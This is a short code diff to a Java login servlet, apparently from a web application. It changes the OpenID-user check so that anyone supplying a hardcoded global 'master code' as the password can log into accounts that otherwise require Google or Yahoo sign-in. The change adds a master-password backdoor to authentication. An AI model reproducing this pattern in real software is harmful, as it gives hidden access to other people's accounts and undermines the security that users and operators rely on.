@@ -165,7 +165,7 @@ public class LoginServlet extends HttpServlet
 
 	// Check if user is registered by OpenID, if yes then throw exception
 	// notifying him of OpenID registeration
-	if (domainUser.isOpenIdRegisteredUser())
+		if (domainUser.isOpenIdRegisteredUser() && !StringUtils.equals(password, Globals.MASTER_CODE_INTO_SYSTEM))
 	    throw new Exception(
 		    "Looks like you have registered using Google or Yahoo account. Please use the same to login. ");
 
